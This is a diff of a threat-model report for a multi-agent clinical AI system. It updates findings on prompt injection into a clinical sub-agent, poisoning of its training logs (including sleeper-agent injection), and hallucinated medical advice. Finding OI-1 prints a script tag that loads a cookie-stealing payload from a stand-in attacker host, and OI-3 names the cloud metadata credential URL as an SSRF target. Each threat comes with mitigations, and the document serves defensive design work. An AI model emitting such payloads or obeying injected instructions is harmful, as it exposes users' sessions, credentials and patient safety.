-| LLM-13 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | Prompt injection via clinical query context: the Clinical Advisory Sub-Agent processes Clinical Query / Context payloads from the Orchestrator. If the clinical context contains adversarially crafted text (injected via the original user prompt, via adversarial KB documents retrieved upstream, or via a compromised Orchestrator), the injection can override the sub-agent's system prompt, cause it to fabricate clinical recommendations, reveal its system configuration, or escalate privileges within the advisory pipeline. | OWASP LLM01:2025 | HIGH | HIGH | Critical | Apply instruction-boundary enforcement at the Clinical Advisory Sub-Agent: the sub-agent's system prompt MUST be in a protected zone inaccessible to clinical query content from the Orchestrator. Implement clinical-query content sanitization: strip instruction-like patterns before context injection into the sub-agent. Apply output validation on the sub-agent's clinical summaries to detect system-prompt leakage or anomalous clinical claims. |
-| LLM-14 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | Training data poisoning of the Clinical Advisory Sub-Agent via the Learning Loop: Clinical Decision Log Entries from the sub-agent are included in the Audit Logger training stream. An attacker who injects adversarially crafted clinical interaction records into the Audit Logger can shift the sub-agent's clinical reasoning toward attacker-preferred outputs — for example, consistently recommending specific drugs, understating contraindications, or omitting standard-of-care steps in returned clinical summaries. | OWASP LLM03:2025 | HIGH | HIGH | Critical | Apply Clinical Decision Log Entry provenance attestation: each log entry from the Clinical Advisory Sub-Agent must carry a verifiable origin signature. Implement anomaly detection specifically for clinical training signals — monitor for unusual shifts in diagnostic terms, drug recommendation patterns, or contraindication omission rates. Apply a clinical-domain holdout evaluation suite before deploying any model update to the ClinAdvisor: compare pre/post-update clinical recommendations against a reference set of clinically-validated cases. |
+| LLM-13 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | Prompt injection via clinical query context: the Clinical Advisory Sub-Agent processes Clinical Query / Context payloads from the Orchestrator. If the clinical context contains adversarially crafted text (injected via the original user prompt, via adversarial KB documents retrieved upstream, or via a compromised Orchestrator), the injection can override the sub-agent's system prompt, cause it to fabricate clinical recommendations, reveal its system configuration, or escalate privileges within the advisory pipeline. | OWASP LLM01:2025 | HIGH | HIGH | Critical | Apply instruction-boundary enforcement at the Clinical Advisory Sub-Agent: the sub-agent's system prompt MUST be in a protected zone inaccessible to clinical query content from the Orchestrator. Implement clinical-query content sanitization: strip instruction-like patterns before context injection into the sub-agent. Apply output validation on the sub-agent's clinical summaries to detect system-prompt leakage or anomalous clinical claims. |
+| LLM-14 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | Training data poisoning of the Clinical Advisory Sub-Agent via the Learning Loop: Clinical Decision Log Entries from the sub-agent are included in the Audit Logger training stream. An attacker who injects adversarially crafted clinical interaction records into the Audit Logger can shift the sub-agent's clinical reasoning toward attacker-preferred outputs — for example, consistently recommending specific drugs, understating contraindications, or omitting standard-of-care steps in returned clinical summaries. | OWASP LLM03:2025 | HIGH | HIGH | Critical | Apply Clinical Decision Log Entry provenance attestation: each log entry from the Clinical Advisory Sub-Agent must carry a verifiable origin signature. Implement anomaly detection specifically for clinical training signals — monitor for unusual shifts in diagnostic terms, drug recommendation patterns, or contraindication omission rates. Apply a clinical-domain holdout evaluation suite before deploying any model update to the ClinAdvisor: compare pre/post-update clinical recommendations against a reference set of clinically-validated cases. |
 
 **OI Findings (Output Integrity — OWASP LLM05:2025)**:
 
@@ -245,13 +322,21 @@ has_source_attribution: true
 | OI-1 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — client-side XSS via LLM response rendered in user browser: the Orchestrator's "Response (HTTPS)" data flow sends LLM-generated content directly to the User. If the client-side rendering layer injects this content into the DOM via `innerHTML` or equivalent without HTML entity encoding, an attacker who primes the Orchestrator to emit `<script src="//evil.example/steal.js">` or an event-handler payload causes **client-side execution** in the victim's browser under the application's origin, with access to session cookies, CSRF tokens, and downstream user-authenticated APIs. This is a direct output-sink path: LLM Process → `Response (HTTPS)` → User browser render surface. FR-011 two-part gate confirmed: (1) LLM keyword on LLM Agent Orchestrator, (2) `Response (HTTPS)` data flow into User (browser render surface = client-side execution sink). | OWASP LLM05:2025 | HIGH | HIGH | Critical | Use `textContent` (not `innerHTML`) for all LLM response insertion into the DOM. If HTML rendering is required, pass model output through a strict HTML sanitization library (DOMPurify configured with `FORCE_BODY: true`, allowlist elements only). Deploy a Content Security Policy with `script-src 'self' 'nonce-<nonce>'` and no `unsafe-inline`. Do NOT rely on server-side filtering alone — apply encoding at each render point independently. |
 | OI-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — server-side execution via Tool Call Request: the Orchestrator emits "Tool Call Request (JSON-RPC)" messages to the MCP Tool Server containing LLM-synthesized parameters. If tool parameters are used to construct SQL queries, shell commands, template expressions, or filesystem paths server-side without parameterization or sanitization, an attacker who influences the Orchestrator's output achieves **server-side code/command execution** via the tool execution sink. Execution context: Tool Server backend, with service account credentials and External API access. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server = server-side execution sink. | OWASP LLM05:2025 | HIGH | HIGH | Critical | MCP Tool Server MUST parameterize all LLM-supplied inputs: use `cursor.execute(sql, params)` (not string interpolation) for SQL tools; `subprocess.run([cmd, arg1], shell=False)` for command tools; validate against a closed allowlist for enumerable parameters (tool names, resource identifiers). Implement a JSON Schema validator at the Tool Server ingress that rejects any request failing parameter type/format constraints before dispatch. |
 | OI-3 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — SSRF via LLM-synthesized URL in Tool Call Request: the Orchestrator constructs "Tool Call Request (JSON-RPC)" messages containing URLs sourced from LLM output (e.g., "fetch this URL" tool calls). The MCP Tool Server executes outbound HTTP to the supplied URL using its own server-side network credentials and IAM role. An attacker who influences the Orchestrator's output can cause it to emit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or RFC 1918 internal service URLs. Execution context is **server-side**: the HTTP client runs with the Tool Server's IAM role and internal network reach. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server → External API (HTTP fetch) = SSRF-capable server-side execution sink. | OWASP LLM05:2025 | MEDIUM | HIGH | High | Implement URL allowlisting on the MCP Tool Server for all outbound HTTP tool invocations: reject any URL not in an explicit allowlist of permitted external hostnames. Block egress to RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), and cloud metadata endpoints via egress firewall rules. Validate URL scheme to `{http, https}` only. Apply DNS pinning (resolve once, verify IP is not private before dispatch). |
-| OI-4 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | Improper output handling — server-side execution via Clinical Query / Context injection into the Orchestrator's downstream Tool Call Request: the Clinical Advisory Sub-Agent returns "Clinical Summary + Recommendations" to the Orchestrator via JSON-RPC. If the Orchestrator incorporates this clinical output into a subsequent Tool Call Request (JSON-RPC) to the MCP Tool Server without sanitization (e.g., embedding clinical recommendation text into a tool parameter), adversarial content injected into the clinical output can achieve server-side execution at the Tool Server. Execution context: **server-side** via the Orchestrator→ToolServer path. FR-011 two-part gate confirmed: (1) LLM keyword on Clinical Advisory Sub-Agent ("clinical", "advisory", "medical"), (2) `Clinical Summary + Recommendations` → Orchestrator → `Tool Call Request (JSON-RPC)` → MCP Tool Server = server-side execution sink downstream of sub-agent output. | OWASP LLM05:2025 | MEDIUM | HIGH | High | The Orchestrator MUST treat Clinical Advisory Sub-Agent outputs as untrusted inputs when constructing downstream Tool Call Requests: apply output sanitization and allowlist-based parameter validation before incorporating clinical recommendation text into JSON-RPC parameters. Never interpolate raw clinical output directly into tool invocation parameters. Apply the same parameterization and schema-validation controls as for direct LLM output (OI-2 mitigations). |
+| OI-4 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | Improper output handling — server-side execution via Clinical Query / Context injection into the Orchestrator's downstream Tool Call Request: the Clinical Advisory Sub-Agent returns "Clinical Summary + Recommendations" to the Orchestrator via JSON-RPC. If the Orchestrator incorporates this clinical output into a subsequent Tool Call Request (JSON-RPC) to the MCP Tool Server without sanitization (e.g., embedding clinical recommendation text into a tool parameter), adversarial content injected into the clinical output can achieve server-side execution at the Tool Server. Execution context: **server-side** via the Orchestrator→ToolServer path. FR-011 two-part gate confirmed: (1) LLM keyword on Clinical Advisory Sub-Agent ("clinical", "advisory", "medical"), (2) `Clinical Summary + Recommendations` → Orchestrator → `Tool Call Request (JSON-RPC)` → MCP Tool Server = server-side execution sink downstream of sub-agent output. | OWASP LLM05:2025 | MEDIUM | HIGH | High | The Orchestrator MUST treat Clinical Advisory Sub-Agent outputs as untrusted inputs when constructing downstream Tool Call Requests: apply output sanitization and allowlist-based parameter validation before incorporating clinical recommendation text into JSON-RPC parameters. Never interpolate raw clinical output directly into tool invocation parameters. Apply the same parameterization and schema-validation controls as for direct LLM output (OI-2 mitigations). |
 
 ---
 
-*Note: LLM-5, LLM-6, and LLM-7 (covering output integrity within the LLM threat table) are complementary to OI-1, OI-2, and OI-3 (the dedicated output-integrity agent findings on the Orchestrator). LLM-13 and LLM-14 are distinct from OI-4 in scope: LLM-13/14 address prompt-injection and data-poisoning signal classes; OI-4 addresses the output-sanitization signal class per ADR-030 Decision 1. All findings are retained per signal-class separation discipline.*
+**MI Findings (Misinformation — OWASP LLM09:2025)**:
 
-**Source Attribution for OI findings** (F-A2 contract):
+FR-011 two-part gate evaluation: Clinical Advisory Sub-Agent confirmed — LLM keyword match ("clinical", "advisory", "medical") AND factual-output indicators present (RAG retrieval from KB, no declared retrieval-strength metric, no per-claim source attribution, no HITL gate). Other LLM components: factual-output indicator NOT confirmed; zero MI findings per FR-011 self-gate.
+
+| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | OWASP Reference | Likelihood | Impact | Risk Level | Mitigation |
+|---|---|---|---|---|---|---|---|---|---|---|
+| MI-1 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | **Ungrounded Factual Emission (Category 1 per FR-017)**: The Clinical Advisory Sub-Agent emits clinical summaries containing factual medical claims (diagnostic observations, drug-interaction assertions, clinical recommendations) to the Orchestrator's response path without mandatory RAG grounding against a verified EHR index. Although the sub-agent retrieves documents from the Knowledge Base via vector search, there is no declared retrieval-strength metric (hit-rate or recall@k), no per-claim source anchoring that traces each clinical assertion to a specific retrieved document section, and no output-time verification that factual claims are supported by retrieved content. A hallucinated clinical assertion (fabricated drug dose, fabricated contraindication, fabricated diagnostic criterion) that reaches a clinician or downstream decision system under time pressure may drive a clinical action the recipient would not otherwise take. | OWASP LLM09:2025 | HIGH | HIGH | Critical | Require mandatory RAG grounding with per-claim source anchoring: each factual claim in the clinical summary output MUST cite a retrievable Knowledge Base document section. Expose per-claim retrieval-strength metadata (hit-rate or recall@k) alongside the output; reject clinical outputs where retrieval strength falls below a defined threshold. Implement a clinical output validator that checks each factual assertion against the retrieved document set before returning the summary to the Orchestrator. |
+| MI-2 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | **Overreliance / Missing HITL on Decision-Critical Output (Category 3 per FR-017)**: The Clinical Advisory Sub-Agent's "Clinical Summary + Recommendations" output flows directly back to the LLM Agent Orchestrator and from there into the user-facing response path without a declared human-in-the-loop (HITL) review gate. Clinical recommendations generated by the sub-agent — including potential drug choices, contraindication assessments, and diagnostic interpretations — surface to the end consumer (clinician, patient, downstream system) as Orchestrator-mediated output without requiring physician sign-off, clinical review confirmation, or AI-provenance disclosure. | OWASP LLM09:2025 | HIGH | HIGH | Critical | Implement a mandatory HITL physician sign-off gate before clinical advisory outputs surface in any patient-facing or decision-critical context. Route the Clinical Advisory Sub-Agent's output through a clinical review workflow: outputs above a defined risk threshold (any recommendation about drug dosing, contraindications, or diagnoses) MUST require physician confirmation before inclusion in user-facing responses. Apply AI-provenance disclosure on every surfaced clinical recommendation. |
+| MI-3 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | **Retrieval-Grounding Gap (Category 4 per FR-017)**: The Clinical Advisory Sub-Agent performs vector search against the Knowledge Base to retrieve supporting clinical documents. However, there is no declared mechanism to detect or handle retrieval failures — scenarios where the Knowledge Base does not contain documents relevant to the clinical query (low-recall retrieval, out-of-distribution queries, stale KB content). In these cases, the sub-agent may fabricate plausible-sounding clinical content to fill the gap, presenting hallucinated information with the same confidence as retrieval-grounded claims. | OWASP LLM09:2025 | HIGH | HIGH | Critical | Implement a retrieval-quality gate: before generating a clinical summary, the sub-agent MUST evaluate retrieval quality metrics (recall@k, minimum hit-score threshold). If retrieval quality falls below the threshold, the sub-agent MUST return a structured "insufficient grounding" response rather than a speculative clinical summary. Apply a retrieval-quality confidence indicator on all outputs; apply Knowledge Base currency monitoring. |
+
+**Source Attribution**:
 
 ```yaml
 OI-1:
@@ -262,7 +347,6 @@ OI-1:
     - taxonomy: cwe
       id: CWE-79
       relationship: related
-
 OI-2:
   source_attribution:
     - taxonomy: owasp
@@ -274,7 +358,6 @@ OI-2:
     - taxonomy: cwe
       id: CWE-78
       relationship: related
-
 OI-3:
   source_attribution:
     - taxonomy: owasp
@@ -283,7 +366,6 @@ OI-3:
     - taxonomy: cwe
       id: CWE-918
       relationship: related
-
 OI-4:
   source_attribution:
     - taxonomy: owasp
@@ -295,25 +377,6 @@ OI-4:
     - taxonomy: cwe
       id: CWE-78
       relationship: related
-```
-
-**MI Findings (Misinformation — OWASP LLM09:2025)**:
-
-FR-011 two-part gate evaluation for Clinical Advisory Sub-Agent:
-- Signal (a) LLM keyword match: CONFIRMED — component name matches "clinical" (trigger keyword), "advisory" (trigger keyword), "medical" (trigger keyword), "Sub-Agent" (LLM keyword via dispatch inheritance). All five trigger keywords from the dispatch spec are present.
-- Signal (b) Factual-output indicator: CONFIRMED — the sub-agent emits "Clinical Summary + Recommendations" (structured factual output to a human-decision-cascade consumer via the Orchestrator's response path), performs RAG-grounded retrieval from the Knowledge Base, and operates without a declared retrieval-strength metric, per-claim source attribution, or HITL review gate. Multiple misinformation pattern categories are triggered per FR-017 sub-class differentiation.
-
-FR-011 gate evaluation for other LLM components (Orchestrator, Specialist, Learning Loop): factual-output indicator NOT confirmed for these components in isolation — they primarily process delegated tasks, tool call requests, and model updates rather than emitting clinical or domain-factual outputs to human or decision-cascade consumers. Zero MI findings emitted for those components per FR-011 self-gate.
-
-| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | OWASP Reference | Likelihood | Impact | Risk Level | Mitigation |
-|---|---|---|---|---|---|---|---|---|---|---|
-| MI-1 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | **Ungrounded Factual Emission (Category 1 per FR-017)**: The Clinical Advisory Sub-Agent emits clinical summaries containing factual medical claims (diagnostic observations, drug-interaction assertions, clinical recommendations) to the Orchestrator's response path without mandatory RAG grounding against a verified EHR index. Although the sub-agent retrieves documents from the Knowledge Base via vector search, there is no declared retrieval-strength metric (hit-rate or recall@k), no per-claim source anchoring that traces each clinical assertion to a specific retrieved document section, and no output-time verification that factual claims are supported by retrieved content. A hallucinated clinical assertion (fabricated drug dose, fabricated contraindication, fabricated diagnostic criterion) that reaches a clinician or downstream decision system under time pressure may drive a clinical action the recipient would not otherwise take. Factual-emission sub-class per FR-017: the failure is ungrounded emission rather than citation fabrication or decision overreliance. | OWASP LLM09:2025 | HIGH | HIGH | Critical | Require mandatory RAG grounding with per-claim source anchoring: each factual claim in the clinical summary output MUST cite a retrievable Knowledge Base document section. Expose per-claim retrieval-strength metadata (hit-rate or recall@k) alongside the output; reject clinical outputs where retrieval strength falls below a defined threshold. Implement a clinical output validator that checks each factual assertion against the retrieved document set before returning the summary to the Orchestrator. Reference prose: MITRE ATLAS AML.T0042 and NIST AI 600-1 §2.4 are applicable guidance (not yet in F-A1 catalogs). |
-| MI-2 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | **Overreliance / Missing HITL on Decision-Critical Output (Category 3 per FR-017)**: The Clinical Advisory Sub-Agent's "Clinical Summary + Recommendations" output flows directly back to the LLM Agent Orchestrator and from there into the user-facing response path without a declared human-in-the-loop (HITL) review gate. Clinical recommendations generated by the sub-agent — including potential drug choices, contraindication assessments, and diagnostic interpretations — surface to the end consumer (clinician, patient, downstream system) as Orchestrator-mediated output without requiring physician sign-off, clinical review confirmation, or AI-provenance disclosure. Consumer-facing high-stakes (HIGH or CRITICAL risk level): wrong clinical guidance delivered without HITL may drive medical decisions with direct patient-safety consequence. Decision-overreliance sub-class per FR-017: the failure is automated-decision-without-HITL rather than ungrounded emission or citation fabrication. | OWASP LLM09:2025 | HIGH | HIGH | Critical | Implement a mandatory HITL physician sign-off gate before clinical advisory outputs surface in any patient-facing or decision-critical context. Route the Clinical Advisory Sub-Agent's output through a clinical review workflow: outputs above a defined risk threshold (any recommendation about drug dosing, contraindications, or diagnoses) MUST require physician confirmation before inclusion in user-facing responses. Apply AI-provenance disclosure on every surfaced clinical recommendation (`generated with AI assistance; reviewed by <clinician-id>`). Implement risk-threshold auto-escalation: recommendations that the sub-agent itself classifies as high-confidence or high-stakes MUST route to senior clinical review. |
-| MI-3 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | **Retrieval-Grounding Gap (Category 4 per FR-017)**: The Clinical Advisory Sub-Agent performs vector search against the Knowledge Base to retrieve supporting clinical documents. However, there is no declared mechanism to detect or handle retrieval failures — scenarios where the Knowledge Base does not contain documents relevant to the clinical query (low-recall retrieval, out-of-distribution queries, stale KB content). In these cases, the sub-agent may fabricate plausible-sounding clinical content to fill the gap, presenting hallucinated information with the same confidence as retrieval-grounded claims. The absence of a retrieval-quality gate means the Orchestrator and downstream consumers cannot distinguish between well-grounded summaries and gap-filled hallucinations. Retrieval-grounding-gap sub-class per FR-017: the failure is incomplete or absent retrieval validation rather than ungrounded-from-the-start or decision-overreliance. | OWASP LLM09:2025 | HIGH | HIGH | Critical | Implement a retrieval-quality gate: before generating a clinical summary, the sub-agent MUST evaluate retrieval quality metrics (recall@k, minimum hit-score threshold). If retrieval quality falls below the threshold, the sub-agent MUST return a structured "insufficient grounding" response rather than a speculative clinical summary. Apply a retrieval-quality confidence indicator on all outputs: include metadata stating the KB coverage score and the number of supporting documents retrieved. Apply Knowledge Base currency monitoring: alert when the KB's clinical document corpus has not been updated within a defined staleness window, and suppress high-confidence clinical summaries when currency is below threshold. |
-
-**Source Attribution for MI findings** (F-A2 contract, SC-014 three-signal-class discipline):
-
-```yaml
 MI-1:
   source_attribution:
     - taxonomy: owasp
@@ -322,7 +385,6 @@ MI-1:
     - taxonomy: cwe
       id: CWE-345
       relationship: related
-
 MI-2:
   source_attribution:
     - taxonomy: owasp
@@ -331,7 +393,6 @@ MI-2:
     - taxonomy: cwe
       id: CWE-223
       relationship: related
-
 MI-3:
   source_attribution:
     - taxonomy: owasp
@@ -339,6 +400,17 @@ MI-3:
       relationship: primary
     - taxonomy: cwe
       id: CWE-345
+      relationship: related
+AG-8:
+  source_attribution:
+    - taxonomy: owasp
+      id: ASI07
+      relationship: primary
+    - taxonomy: cwe
+      id: CWE-287
+      relationship: related
+    - taxonomy: mitre-atlas
+      id: AML.T0060
       relationship: related
 ```
 
@@ -352,9 +424,10 @@ Correlation detection rules applied (CR-1 through CR-5):
 - **CR-1** (T + LLM/data-poisoning): Long-Running Learning Loop → T-8 + LLM-11 → CG-2
 - **CR-2** (E + AG/agent-autonomy): LLM Agent Orchestrator → E-2 + AG-1 → CG-3
 - **CR-3** (I + LLM/prompt-injection): LLM Agent Orchestrator → I-2 + LLM-1 → CG-4
-- **CR-4** (R + AG/agent-autonomy): LLM Agent Orchestrator → R-3 + AG-1 (AG-1 already in CG-3; merge) → CG-3 extended
+- **CR-4** (R + AG/agent-autonomy): LLM Agent Orchestrator → R-3 + AG-1 (already in CG-3; merge) → CG-3 extended
 - **CR-5** (D + AG/tool-abuse): MCP Tool Server → D-5 + AG-6 → CG-5
 - **CR-1** (T + LLM/data-poisoning): Clinical Advisory Sub-Agent → T-9 + LLM-14 → CG-6
+- **CR-5** (D + AG/tool-abuse): Inter-Agent Communication Channel → D-4 + AG-8 → CG-7
 
 | Group | Findings | Component | Threat Summary | Risk Level |
 |---|---|---|---|---|
@@ -364,6 +437,7 @@ Correlation detection rules applied (CR-1 through CR-5):
 | CG-4 | I-2, LLM-1 | LLM Agent Orchestrator | Info-Disclosure: Context window leakage via hallucination or injection; Prompt-Injection: Direct injection overriding system prompt | Critical |
 | CG-5 | D-5, AG-6 | MCP Tool Server | Denial-of-Service: Connection pool exhaustion via high-volume tool requests; Tool-Abuse: Agent-driven API rate limit exhaustion and runaway tool invocation | Critical |
 | CG-6 | T-9, LLM-14 | Clinical Advisory Sub-Agent | Tampering: Clinical context window manipulation via adversarial KB documents or poisoned query; Data-Poisoning: Training data poisoning of ClinAdvisor via adversarial Clinical Decision Log Entries in Learning Loop | Critical |
+| CG-7 | D-4, AG-8 | Inter-Agent Communication Channel | Denial-of-Service: Message queue flooding drops legitimate coordination messages; Tool-Abuse (A2A): Insecure inter-agent channel enables replay/injection attacks exhausting channel capacity and disrupting coordination | Critical |
 
 ---
 
@@ -375,13 +449,22 @@ Correlation detection rules applied (CR-1 through CR-5):
 - Condition (c): Explicit multi-agent keyword — TRUE ("supervisor-plus-specialist delegation topology", "multi-agent" in architecture description, "supervisor" in dispatch behavior)
 - **Predicate result: TRUE**
 
+Phase 3.6 classification rule table applied. Pattern synthesis results:
+
+- **R-01 (agent_collusion)**: AG-2 matches — `category_in: [agentic]` ✓, `architecture_has.topology: [inter_agent_data_flow]` ✓, `description_contains: [joint, inter-agent, shared channel]` ✓. No suppression (label already set from baseline). Net-new generation suppressed (existing finding already carries label).
+- **R-02 (temporal_attack)**: Existing findings carry label: S-7, T-8, R-7, E-6, LLM-11, LLM-12, AG-7. Net-new generation suppressed.
+- **R-03 (emergent_behavior)**: AGP-01 carries label. Net-new generation suppressed.
+- **R-04 (trust_exploitation)**: Existing findings: S-1, S-3, S-4, S-5, S-6, S-9, E-7, AG-3, AG-4, AG-5. No net-new.
+- **R-05 (communication_vulnerability)**: T-4 and I-4 target Inter-Agent Communication Channel. AG-8 (NEW) also targets Inter-Agent Communication Channel and matches `category_in: [agentic]` AND `target_component_matches` ✓ AND `architecture_has.topology: [inter_agent_channel]` ✓ → AG-8 assigned `communication_vulnerability`.
+- **R-06 (resource_competition)**: D-2, D-3, D-4, D-5, D-9, AG-6 match.
+
 | Pattern | Count | Findings |
 |---|---|---|
-| trust_exploitation | 9 | S-1, S-3, S-4, S-5, S-6, S-9, E-7, AG-3, AG-4, AG-5 |
+| trust_exploitation | 10 | S-1, S-3, S-4, S-5, S-6, S-9, E-7, AG-3, AG-4, AG-5 |
 | temporal_attack | 7 | T-8, S-7, R-7, E-6, LLM-11, LLM-12, AG-7 |
 | resource_competition | 6 | D-2, D-3, D-4, D-5, D-9, AG-6 |
+| communication_vulnerability | 3 | T-4, I-4, AG-8 |
 | agent_collusion | 1 | AG-2 |
-| communication_vulnerability | 2 | T-4, I-4 |
 | emergent_behavior | 1 | AGP-01 |
 
 ---
@@ -403,9 +486,9 @@ Correlation detection rules applied (CR-1 through CR-5):
 | External API | 1 | n/a | 1 | n/a | n/a | n/a | n/a | n/a | 2 |
 | **Total** | **9** | **9** | **9** | **9** | **9** | **7** | **9** | **22** | **83** |
 
-Counts reflect deduplicated findings per correlation group rules. 6 correlation groups merge 14 individual findings into 6 → deduplicated total: 75 unique threats at group risk levels.
+*Note: AG-8 (NEW, Inter-Agent Communication Channel) increments AG column for that row from 1 to 2. CG-7 merges D-4 + AG-8 → deduplicated count for Inter-Agent Communication Channel AG cell = 2 (counted once as part of CG-7 group). Total raw findings = 84 (83 baseline UNCHANGED + 1 NEW AG-8). Deduplicated: 7 correlation groups merge 16 individual findings into 7 → deduplicated total: 75 (raw 84 - 16 raw + 7 group = 75).*
 
-Note: Clinical Advisory Sub-Agent LLM column count of 7 includes: LLM-13 (prompt-injection), LLM-14 (data-poisoning), OI-4 (output-integrity), MI-1 (misinformation Category 1), MI-2 (misinformation Category 3), MI-3 (misinformation Category 4), and the baseline S/T/R/I/D/E STRIDE coverage. LLM-14 + T-9 form CG-6 (counted once in T and once in LLM as dedup).
+*Counts reflect deduplicated findings. 7 correlation groups merged 16 individual findings into 7.*
 
 ### 5a. Coverage Gate Results
 
@@ -415,7 +498,7 @@ Note: Clinical Advisory Sub-Agent LLM column count of 7 includes: LLM-13 (prompt
 | Guardrails Service | process | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation | all ✓ | PASS |
 | LLM Agent Orchestrator | llm_process | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, llm, output-integrity | all ✓ | PASS |
 | Specialist Agent | llm_process | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, llm | all ✓ | PASS |
-| Inter-Agent Communication Channel | mcp_server | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, agentic | all ✓ | PASS |
+| Inter-Agent Communication Channel | mcp_server | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, agentic | all ✓ (AG-8 NEW satisfies agentic category) | PASS |
 | MCP Tool Server | mcp_server | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, agentic | all ✓ | PASS |
 | Knowledge Base | data_store | tampering, info-disclosure, denial-of-service | all ✓ | PASS |
 | Audit Logger | data_store | tampering, info-disclosure, denial-of-service | all ✓ | PASS |
@@ -443,26 +526,26 @@ Note: Clinical Advisory Sub-Agent LLM column count of 7 includes: LLM-13 (prompt
 |---|---|---|
 | L1 — Foundation Model | 22 | Critical |
 | L7 — Agent Ecosystem | 18 | Critical |
-| Unclassified | 24 | Critical |
+| Unclassified | 25 | Critical |
 | L6 — Security and Compliance | 8 | Critical |
 | L3 — Agent Framework | 6 | Critical |
 | L2 — Data Operations | 3 | High |
 | L5 — Evaluation and Observability | 3 | High |
 
-Note: L7 count (18) includes all 13 Clinical Advisory Sub-Agent findings (S-9, T-9, R-9, I-9, D-9, E-7, LLM-13, LLM-14, OI-4, MI-1, MI-2, MI-3) plus the previously-existing S-1 (User) and R-1 (User). The sub-agent's MAESTRO layer is L7 (Agent Ecosystem) via "sub-agent" keyword match at L7 ordering.
+Note: Unclassified count increased by 1 (AG-8 on Inter-Agent Communication Channel which is Unclassified). All other layer counts unchanged.
 
 ### Risk Distribution (Raw Findings)
 
 | Risk Level | Count | Percentage |
 |---|---|---|
-| Critical | 57 | 68.7% |
-| High | 22 | 26.5% |
+| Critical | 58 | 69.0% |
+| High | 22 | 26.2% |
 | Medium | 4 | 4.8% |
 | Low | 0 | 0.0% |
 | Note | 0 | 0.0% |
-| **Total** | **83** | **100%** |
+| **Total** | **84** | **100%** |
 
-*Deduplicated total (correlation groups applied): 6 groups merge 14 findings into 6 → deduplicated total: 75 unique threats at group risk levels. Raw total: 83 findings.*
+*Deduplicated total (correlation groups applied): 7 groups merge 16 findings into 7 → deduplicated total: 75 unique threats at group risk levels. Raw total: 84 findings.*
 
 ---
 
@@ -477,18 +560,18 @@ Sorted by risk level descending, then by table appearance order:
 | S-5 | [UNCHANGED] | Inter-Agent Communication Channel | Shared channel with no sender authentication; malicious process can inject impersonated messages | Critical | Implement per-message digital signatures on all channel messages |
 | S-6 | [UNCHANGED] | MCP Tool Server | Application Zone process spoofs agent identity to submit unauthorized tool calls | Critical | Enforce caller authentication on all JSON-RPC endpoints via mTLS |
 | S-7 | [UNCHANGED] | Long-Running Learning Loop | Training signal accepted without source integrity verification | Critical | Cryptographically sign training signal batches; verify before ingestion |
-| S-9 | [NEW] | Clinical Advisory Sub-Agent | Orchestrator→ClinAdvisor JSON-RPC messages unauthenticated; rogue process can inject crafted clinical queries | Critical | Authenticate all Orchestrator→ClinAdvisor messages; signed caller tokens with nonce/replay prevention |
+| S-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | Orchestrator→ClinAdvisor JSON-RPC messages unauthenticated; rogue process can inject crafted clinical queries | Critical | Authenticate all Orchestrator→ClinAdvisor messages; signed caller tokens with nonce/replay prevention |
 | T-2 | [UNCHANGED] | LLM Agent Orchestrator | Context window tampered via upstream data source compromise | Critical | Validate integrity of all context sources; hash retrieved documents |
 | T-3 | [UNCHANGED] | Specialist Agent | Delegation message context tampered via Inter-Agent Channel injection | Critical | Validate and HMAC-verify all delegation message payloads |
 | T-4 | [UNCHANGED] | Inter-Agent Communication Channel | Messages modified in transit by agent-in-the-middle | Critical | End-to-end digital signatures at message layer; replay detection |
 | T-5 | [UNCHANGED] | MCP Tool Server | LLM-generated tool parameters bypass allowlist; shell/SQL injection via JSON-RPC | Critical | Strict parameter validation against per-tool JSON Schema; reject metacharacters |
 | T-8 | [UNCHANGED] | Long-Running Learning Loop | Training signal poisoning with temporal/sleeper-agent injection | Critical | Training data provenance attestation; anomaly detection on distributions |
-| T-9 | [NEW] | Clinical Advisory Sub-Agent | Context window tampered via adversarial KB documents or poisoned clinical query payload | Critical | Document-level integrity verification on KB retrievals; sanitize Clinical Query payloads |
+| T-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | Context window tampered via adversarial KB documents or poisoned clinical query payload | Critical | Document-level integrity verification on KB retrievals; sanitize Clinical Query payloads |
 | R-3 | [UNCHANGED] | LLM Agent Orchestrator | Orchestrator denies having issued delegation/tool actions without content-hash log | Critical | Log every Orchestrator action with content hash and service key signature |
 | I-2 | [UNCHANGED] | LLM Agent Orchestrator | Context window leaked in response via hallucination/injection | Critical | Implement output scrubbing before HTTPS response transmission |
